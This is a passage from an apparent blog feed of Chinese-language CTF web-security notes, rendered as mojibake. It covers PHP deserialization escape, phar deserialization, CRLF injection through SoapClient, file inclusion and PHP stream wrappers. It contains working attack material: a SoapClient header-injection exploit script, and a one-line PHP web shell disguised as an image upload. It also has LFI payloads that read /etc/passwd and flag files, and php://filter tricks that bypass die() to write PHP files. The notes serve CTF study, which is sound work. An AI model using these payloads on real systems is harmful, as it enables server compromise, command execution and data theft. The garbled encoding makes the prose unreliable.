class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//å°†è‡ªå®šä¹‰ meta-data å­˜å…¥ manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br>    <span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="ç„¶åå°±æ˜¯åˆ©ç”¨ï¼Œå¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼š"><a href="#ç„¶åå°±æ˜¯åˆ©ç”¨ï¼Œå¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼š" class="headerlink" title="ç„¶åå°±æ˜¯åˆ©ç”¨ï¼Œå¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼š"></a>ç„¶åå°±æ˜¯åˆ©ç”¨ï¼Œå¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼š</h3><ul><li><code>file_get_contents</code></li><li><code>fileatime</code></li><li><code>filectime</code></li><li><code>file_ctime</code></li><li><code>is_dir</code></li><li><code>is_file</code></li><li><code>is_executable</code></li><li><code>copy</code></li><li><code>unlink</code></li><li><code>stat</code></li><li><code>readfile</code></li></ul><h3 id="åˆ©ç”¨-file-get-contents-å¯ä»¥è®¿é—®è‡ªå·±ç½‘ç«™ä¸Šçš„-Pharï¼š"><a href="#åˆ©ç”¨-file-get-contents-å¯ä»¥è®¿é—®è‡ªå·±ç½‘ç«™ä¸Šçš„-Pharï¼š" class="headerlink" title="åˆ©ç”¨ file_get_contents å¯ä»¥è®¿é—®è‡ªå·±ç½‘ç«™ä¸Šçš„ Pharï¼š"></a>åˆ©ç”¨ <code>file_get_contents</code> å¯ä»¥è®¿é—®è‡ªå·±ç½‘ç«™ä¸Šçš„ Pharï¼š</h3><ul><li><code>cd /var/www/html</code></li><li><code>sudo chown www-data:www-data /var/www/html -R</code></li><li><code>sudo nano writefile.php</code></li></ul><h3 id="æˆ–è€…å¾—åˆ°çš„æ•°æ®ç›´æ¥ä¸Šä¼ åˆ°ä»»æ„è·¯å¾„ä¸­ï¼Œå†ç”¨-phar-xxxxx-ä¼ åˆ°-file-get-content"><a href="#æˆ–è€…å¾—åˆ°çš„æ•°æ®ç›´æ¥ä¸Šä¼ åˆ°ä»»æ„è·¯å¾„ä¸­ï¼Œå†ç”¨-phar-xxxxx-ä¼ åˆ°-file-get-content" class="headerlink" title="æˆ–è€…å¾—åˆ°çš„æ•°æ®ç›´æ¥ä¸Šä¼ åˆ°ä»»æ„è·¯å¾„ä¸­ï¼Œå†ç”¨ phar://xxxxx ä¼ åˆ° file_get_content"></a>æˆ–è€…å¾—åˆ°çš„æ•°æ®ç›´æ¥ä¸Šä¼ åˆ°ä»»æ„è·¯å¾„ä¸­ï¼Œå†ç”¨ <code>phar://xxxxx</code> ä¼ åˆ° <code>file_get_content</code></h3><h3 id="åˆ©ç”¨-data-åœ¨-PHP-ç»ˆç«¯åˆ¶é€ ï¼š"><a href="#åˆ©ç”¨-data-åœ¨-PHP-ç»ˆç«¯åˆ¶é€ ï¼š" class="headerlink" title="åˆ©ç”¨ data:// åœ¨ PHP ç»ˆç«¯åˆ¶é€ ï¼š"></a>åˆ©ç”¨ <code>data://</code> åœ¨ PHP ç»ˆç«¯åˆ¶é€ ï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ph</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$ph</span>);<br></code></pre></td></tr></table></figure><ul><li><strong>è®© <code>file_get_contents</code> åŒ…å« <code>&#123;data://text/plain;base64ï¼ˆå†™å…¥ç»ˆç«¯ç»“æœï¼‰&#125;</code> åˆ° <code>xxx.html</code>ï¼ˆåç¼€ä¸é‡è¦ï¼‰ï¼Œæœ€åè®© <code>file_get_contents</code> åŒ…å« <code>phar://xxx.html</code>ã€‚</strong></li></ul><hr><h1 id="æ€»ç»“ä¸€ä¸‹åˆ©ç”¨-PHP-ååºåˆ—åŒ–é€ƒé€¸çš„æ­¥éª¤"><a href="#æ€»ç»“ä¸€ä¸‹åˆ©ç”¨-PHP-ååºåˆ—åŒ–é€ƒé€¸çš„æ­¥éª¤" class="headerlink" title="æ€»ç»“ä¸€ä¸‹åˆ©ç”¨ PHP ååºåˆ—åŒ–é€ƒé€¸çš„æ­¥éª¤"></a>æ€»ç»“ä¸€ä¸‹åˆ©ç”¨ PHP ååºåˆ—åŒ–é€ƒé€¸çš„æ­¥éª¤</h1><ol><li>ç¡®å®šåˆ©ç”¨ç›®æ ‡</li><li>æŒ‰ç…§åŸç¨‹åºæ­£å¸¸åºåˆ—åŒ–çš„æ­¥éª¤åšä¸€éï¼Œçœ‹çœ‹æ­£å¸¸åºåˆ—åŒ–å­—ç¬¦ä¸²çš„ç»“æ„ï¼ŒåŸºäºæ­¤è€ƒè™‘æ”»å‡»æ–¹å¼ã€‚æ³¨æ„ï¼Œé”®å€¼å¯¹è®¾ç½®çš„é¡ºåºä¼šå½±å“åºåˆ—åŒ–ç»“æœï¼Œä¸€å®šè¦æŒ‰ç…§ç¨‹åºå†…çš„æ–¹å¼è®¾ç½®å€¼ã€‚</li><li>è®¡ç®—é€ƒé€¸æ€»å…±éœ€è¦çš„å­—ç¬¦ï¼Œè€ƒè™‘éœ€è¦æ„å»ºå¤šå°‘è¢«æ›¿æ¢çš„å­—ç¬¦ã€‚</li><li>æ’å…¥ payloadï¼Œç»“åˆæœ¬åœ°è¿è¡Œç»“æœæŸ¥çœ‹ payload æ˜¯å¦æˆåŠŸ</li></ol><h3 id="PHP-ååºåˆ—åŒ–é€ƒé€¸çš„æ ‡å¿—å°±æ˜¯ï¼Œåœ¨åºåˆ—åŒ–å®Œæˆåå¯¹åºåˆ—åŒ–ç»“æœçš„å­—ç¬¦ä¸²åšæ›¿æ¢ã€‚åªè¦ç¨‹åºè¿™ä¹ˆå†™ï¼Œç»å¯¹æœ‰é—®é¢˜ã€‚"><a href="#PHP-ååºåˆ—åŒ–é€ƒé€¸çš„æ ‡å¿—å°±æ˜¯ï¼Œåœ¨åºåˆ—åŒ–å®Œæˆåå¯¹åºåˆ—åŒ–ç»“æœçš„å­—ç¬¦ä¸²åšæ›¿æ¢ã€‚åªè¦ç¨‹åºè¿™ä¹ˆå†™ï¼Œç»å¯¹æœ‰é—®é¢˜ã€‚" class="headerlink" title="PHP ååºåˆ—åŒ–é€ƒé€¸çš„æ ‡å¿—å°±æ˜¯ï¼Œåœ¨åºåˆ—åŒ–å®Œæˆåå¯¹åºåˆ—åŒ–ç»“æœçš„å­—ç¬¦ä¸²åšæ›¿æ¢ã€‚åªè¦ç¨‹åºè¿™ä¹ˆå†™ï¼Œç»å¯¹æœ‰é—®é¢˜ã€‚"></a>PHP ååºåˆ—åŒ–é€ƒé€¸çš„æ ‡å¿—å°±æ˜¯ï¼Œåœ¨åºåˆ—åŒ–å®Œæˆåå¯¹åºåˆ—åŒ–ç»“æœçš„å­—ç¬¦ä¸²åšæ›¿æ¢ã€‚åªè¦ç¨‹åºè¿™ä¹ˆå†™ï¼Œç»å¯¹æœ‰é—®é¢˜ã€‚</h3><hr><h1 id="CRLF-æ”»å‡»"><a href="#CRLF-æ”»å‡»" class="headerlink" title="CRLF æ”»å‡»"></a>CRLF æ”»å‡»</h1><h3 id="åˆ©ç”¨æ¡ä»¶ï¼š"><a href="#åˆ©ç”¨æ¡ä»¶ï¼š" class="headerlink" title="åˆ©ç”¨æ¡ä»¶ï¼š"></a>åˆ©ç”¨æ¡ä»¶ï¼š</h3><ul><li>æºç éœ€è¦è¿›è¡Œååºåˆ—åŒ–</li><li>æºç è°ƒç”¨ä¸€ä¸ªæ–¹æ³•ï¼Œä¸”è¯¥æ–¹æ³•ä¸å­˜åœ¨ã€‚ä»¥æ­¤æ¿€æ´» <code>__call()</code></li></ul><h3 id="åˆ©ç”¨èŒƒå›´ï¼ˆPHP-5-PHP-7ï¼‰ï¼š"><a href="#åˆ©ç”¨èŒƒå›´ï¼ˆPHP-5-PHP-7ï¼‰ï¼š" class="headerlink" title="åˆ©ç”¨èŒƒå›´ï¼ˆPHP 5, PHP 7ï¼‰ï¼š"></a>åˆ©ç”¨èŒƒå›´ï¼ˆPHP 5, PHP 7ï¼‰ï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VulnerableClass</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$userAgent</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$userAgent</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;userAgent = <span class="hljs-variable">$userAgent</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>) </span>&#123;<br>        <span class="hljs-comment">// è¾“å‡ºä¸€æ¡æ¶ˆæ¯ï¼Œæ¨¡æ‹Ÿ __call é­”æœ¯æ–¹æ³•è¢«è§¦å‘</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Method <span class="hljs-subst">$name</span> was called!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUserAgent</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;userAgent;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// æ¨¡æ‹Ÿç”¨æˆ·è¾“å…¥ååºåˆ—åŒ–çš„æ“ä½œ</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>-&gt;<span class="hljs-title function_ invoke__">getUserAgent</span>();<br>    <span class="hljs-comment">// è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œæ¿€æ´» __call æ–¹æ³•</span><br>    <span class="hljs-variable">$obj</span>-&gt;<span class="hljs-title function_ invoke__">nonExistentMethod</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://xxx.xxx.xxx.xxx:5555/&quot;</span>;<br><span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;data=abc&#x27;</span>;<br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span><br>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;hello&#x27;</span>));<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\n\r&quot;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aa</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aa</span>-&gt;<span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>phpååºåˆ—åŒ–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–‡ä»¶æ“ä½œç¯‡</title>
    <link href="/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/"/>
    <url>/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><ul><li><code>include()</code> æ–‡ä»¶çš„å†…å®¹å°†ä½œä¸º PHP ä»£ç æ‰§è¡Œï¼Œæ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬å°†ç»§ç»­è¿è¡Œã€‚</li><li><code>include_once()</code> å”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚</li><li><code>require()</code> æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œå¹¶åœæ­¢è„šæœ¬è¿è¡Œã€‚</li><li><code>require_once()</code> å”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚</li><li>è‹¥æ–‡ä»¶å†…å®¹ç¬¦åˆ PHP è¯­æ³•è§„èŒƒï¼ŒåŒ…å«æ—¶ä¸ç®¡æ‰©å±•åæ˜¯ä»€ä¹ˆéƒ½ä¼šè¢« PHP è§£æã€‚è‹¥æ–‡ä»¶å†…å®¹ä¸ç¬¦åˆ PHP è¯­æ³•è§„èŒƒåˆ™ä¼šæš´éœ²å…¶æºç ã€‚</li></ul><h1 id="è·¯å¾„é—®é¢˜"><a href="#è·¯å¾„é—®é¢˜" class="headerlink" title="è·¯å¾„é—®é¢˜"></a>è·¯å¾„é—®é¢˜</h1><ul><li><code>.</code>ï¼ˆå•ä¸ªç‚¹ï¼‰ï¼šè¡¨ç¤ºå½“å‰ç›®å½•ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå½“å‰ç›®å½•æ˜¯ <code>/var/www/html</code>ï¼Œé‚£ä¹ˆ <code>./phpinfo.txt</code> å°±è¡¨ç¤º <code>/var/www/html/phpinfo.txt</code>ã€‚</li><li><code>..</code>ï¼ˆä¸¤ä¸ªç‚¹ï¼‰ï¼šè¡¨ç¤ºä¸Šä¸€çº§ç›®å½•ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå½“å‰ç›®å½•æ˜¯ <code>/var/www/html</code>ï¼Œé‚£ä¹ˆ <code>../phpinfo.txt</code> å°±è¡¨ç¤º <code>/var/www/phpinfo.txt</code>ã€‚</li><li>å¦‚æœæ˜¯ PHP æ–‡ä»¶ flag æœ€å¥½ç”¨ base è¯»ï¼Œtxt ç›´æ¥åŒ…å«å°±è¡Œã€‚</li></ul><h1 id="ä¼ªåè®®æ“ä½œ"><a href="#ä¼ªåè®®æ“ä½œ" class="headerlink" title="ä¼ªåè®®æ“ä½œ"></a>ä¼ªåè®®æ“ä½œ</h1><h3 id="file"><a href="#file" class="headerlink" title="file://"></a><code>file://</code></h3><ul><li>æ¡ä»¶ï¼š<ul><li><code>allow_url_fopen</code>ï¼šä¸å—å½±å“</li><li><code>allow_url_include</code>ï¼šä¸å—å½±å“</li></ul></li><li>ä½œç”¨ï¼šç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚</li><li>è¯´æ˜ï¼š<ul><li><code>file://</code> æ˜¯ PHP ä½¿ç”¨çš„é»˜è®¤å°è£…åè®®ï¼Œå±•ç°äº†æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚å½“æŒ‡å®šäº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼ˆä¸ä»¥ &#x2F;ã€\ã€\ æˆ– Windows ç›˜ç¬¦å¼€å¤´çš„è·¯å¾„ï¼‰æä¾›çš„è·¯å¾„å°†åŸºäºå½“å‰çš„å·¥ä½œç›®å½•ã€‚åœ¨å¾ˆå¤šæƒ…å†µä¸‹æ˜¯è„šæœ¬æ‰€åœ¨çš„ç›®å½•ï¼Œé™¤éè¢«ä¿®æ”¹äº†ã€‚ä½¿ç”¨ CLI çš„æ—¶å€™ï¼Œç›®å½•é»˜è®¤æ˜¯è„šæœ¬è¢«è°ƒç”¨æ—¶æ‰€åœ¨çš„ç›®å½•ã€‚</li><li>åœ¨æŸäº›å‡½æ•°é‡Œï¼Œä¾‹å¦‚ <code>fopen()</code> å’Œ <code>file_get_contents()</code>ï¼Œ<code>include_path</code> ä¼šå¯é€‰åœ°æœç´¢ï¼Œä¹Ÿä½œä¸ºç›¸å¯¹çš„è·¯å¾„ã€‚</li></ul></li><li>ç¤ºä¾‹ï¼š<ul><li><code>http://127.0.0.1/?filename=file:///etc/passwd</code></li></ul></li></ul><h3 id="php"><a href="#php" class="headerlink" title="php://"></a><code>php://</code></h3><ul><li>æ¡ä»¶ï¼š<ul><li><code>allow_url_fopen</code>ï¼šä¸å—å½±å“</li><li><code>allow_url_include</code>ï¼šä»… <code>php://input</code>ã€<code>php://stdin</code>ã€<code>php://memory</code>ã€<code>php://temp</code> éœ€è¦ <code>on</code>ã€‚</li></ul></li><li>ä½œç”¨ï¼šè®¿é—®å„ä¸ªè¾“å…¥ &#x2F; è¾“å‡ºæµï¼ˆI&#x2F;O streamsï¼‰</li><li>è¯´æ˜ï¼š<ul><li>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥ &#x2F; è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œå†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚</li><li><code>php://input</code> å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚å¦‚æœå¯ç”¨äº† <code>enable_post_data_reading</code> é€‰é¡¹ï¼Œ<code>php://input</code> åœ¨ä½¿ç”¨ <code>enctype=&quot;multipart/form-data&quot;</code> çš„ POST è¯·æ±‚ä¸­ä¸å¯ç”¨ã€‚</li><li><code>php://output</code> åªå†™çš„æ•°æ®æµï¼Œå…è®¸ä½ ä»¥ <code>print</code> å’Œ <code>echo</code> ä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚</li><li><code>php://fd</code> (&gt;&#x3D;5.3.6) å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¾‹å¦‚ <code>php://fd/3</code> å¼•ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ 3ã€‚</li><li><code>php://memory</code>ã€<code>php://temp</code> (&gt;&#x3D;5.1.0) ç±»ä¼¼æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ä¸¤è€…çš„ä¸€ä¸ªåŒºåˆ«æ˜¯ <code>php://memory</code> æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œ <code>php://temp</code> ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ 2MBï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ <code>sys_get_temp_dir()</code> çš„æ–¹å¼ä¸€è‡´ã€‚<code>php://temp</code> çš„å†…å­˜é™åˆ¶å¯é€šè¿‡æ·»åŠ  <code>/maxmemory:NN</code> æ¥æ§åˆ¶ï¼ŒNN æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½ã€ä¿ç•™åœ¨å†…å­˜çš„æœ€å¤§æ•°æ®é‡ï¼Œè¶…è¿‡åˆ™ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶ã€‚</li><li><code>php://filter/[read|write]=è¿‡æ»¤å™¨åç§°/resource=filename</code><ul><li><code>read</code> æ“ä½œï¼šåœ¨è¯»å–æ•°æ®æ—¶åº”ç”¨è¿‡æ»¤å™¨ã€‚</li><li><code>write</code> æ“ä½œï¼šåœ¨å†™å…¥æ•°æ®æ—¶åº”ç”¨è¿‡æ»¤å™¨ã€‚</li><li>è¿‡æ»¤å™¨ï¼š<ul><li><code>string.rot13</code>ï¼šå¯¹æ•°æ®è¿›è¡Œ ROT13 å˜æ¢ã€‚</li><li><code>string.toupper</code>ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ã€‚</li><li><code>string.tolower</code>ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ã€‚</li><li><code>convert.base64-encode</code>ï¼šå°†æ•°æ®è¿›è¡Œ Base64 ç¼–ç ã€‚</li><li><code>convert.base64-decode</code>ï¼šå°†æ•°æ®è¿›è¡Œ Base64 è§£ç ã€‚</li><li><code>convert.quoted-printable-encode</code>ï¼šå°†æ•°æ®è¿›è¡Œ Quoted-Printable ç¼–ç ã€‚</li><li><code>convert.quoted-printable-decode</code>ï¼šå°†æ•°æ®è¿›è¡Œ Quoted-Printable è§£ç ã€‚</li><li><code>convert.iconv.UTF-8/ISO-8859-1</code>ï¼šå°†æ•°æ®ä» UTF-8 ç¼–ç è½¬æ¢ä¸º ISO-8859-1 ç¼–ç ï¼ˆiconv éœ€è¦å®‰è£…ï¼‰ã€‚</li><li><code>zlib.deflate</code>ï¼šå¯¹æ•°æ®è¿›è¡Œ DEFLATE å‹ç¼©ã€‚</li><li><code>zlib.inflate</code>ï¼šå¯¹æ•°æ®è¿›è¡Œ DEFLATE è§£å‹ç¼©ã€‚</li><li><code>zlib.encode</code>ï¼šå¯¹æ•°æ®è¿›è¡Œ gzip ç¼–ç ã€‚</li><li><code>zlib.decode</code>ï¼šå¯¹æ•°æ®è¿›è¡Œ gzip è§£ç ã€‚</li></ul></li></ul></li><li><code>resource=php://input</code>ï¼šè¯»å–è¯·æ±‚çš„åŸå§‹æ•°æ®ã€‚</li><li><code>resource=php://stdin</code>ï¼šè¯»å–æ ‡å‡†è¾“å…¥ã€‚</li><li><code>resource=php://stdout</code>ï¼šå†™å…¥æ ‡å‡†è¾“å‡ºã€‚</li><li><code>resource=php://stderr</code>ï¼šå†™å…¥æ ‡å‡†é”™è¯¯è¾“å‡ºã€‚</li></ul></li><li>ç¤ºä¾‹ï¼š<ul><li><code>file_put_contents(a,b)</code> å°† b çš„å†…å®¹å†™å…¥ a ä¸­ï¼Œæ­£å¥½è§¦å‘äº† write</li><li><code>file_get_contents()</code> ç›´æ¥è§¦å‘ read</li></ul></li></ul><h3 id="ç”¨-phar-åè®®"><a href="#ç”¨-phar-åè®®" class="headerlink" title="ç”¨ phar åè®®"></a>ç”¨ phar åè®®</h3><ul><li>åˆ›å»ºä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ <code>1.php</code>ï¼Œå†…å®¹ä¸ºï¼š<code>&lt;?php @system($_GET[0]);?&gt;</code>ã€‚ç„¶åå‹ç¼©æˆ zip æ–‡ä»¶ï¼Œéšåä¿®æ”¹åç¼€åä¸º <code>.png</code> æˆ–è€… <code>.jpg</code>ï¼Œä¸Šä¼ è¯¥æ–‡ä»¶ã€‚</li><li>ç¤ºä¾‹ï¼š<ul><li><code>?file=phar://upload/1.jpg/1&amp;0=cat%20/f1aaaag</code></li></ul></li></ul><h3 id="ç”¨-zip-åè®®"><a href="#ç”¨-zip-åè®®" class="headerlink" title="ç”¨ zip åè®®"></a>ç”¨ zip åè®®</h3><ul><li>å‹ç¼©æˆ zip æ–‡ä»¶ï¼Œéšåä¿®æ”¹åç¼€åä¸º <code>.png</code> æˆ–è€… <code>.jpg</code>ï¼Œä¸Šä¼ è¯¥æ–‡ä»¶ã€‚</li><li>ç¤ºä¾‹ï¼š<ul><li><code>?file=zip://upload/1.jpg%231&amp;0=cat /f1aaggggg</code></li></ul></li></ul><h3 id="ç»•è¿‡æ­»äº¡-die"><a href="#ç»•è¿‡æ­»äº¡-die" class="headerlink" title="ç»•è¿‡æ­»äº¡ die"></a>ç»•è¿‡æ­»äº¡ die</h3><ul><li><p>éœ€è¦ URL ç¼–ç ï¼š</p><ul><li><code>GET: ?file=php://filter/write=convert.base64-decode/resource=1.php</code></li><li><code>?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</code></li></ul></li><li><p>éœ€è¦ base64 ç¼–ç ï¼Œç¼–ç åæœ€å‰é¢æ·»åŠ ä¸¤ä¸ªå­—æ¯å¦‚ï¼š<code>aa</code>ï¼š</p><ul><li><code>POST: content=&lt;?php system(&#39;cat f*&#39;);</code></li><li><code>content=aaPD9waHAgcGhwaW5mbygpOz8+</code></li></ul></li><li><p>æˆ–ï¼š</p><ul><li>éœ€è¦ URL ç¼–ç ï¼š<ul><li><code>GET: 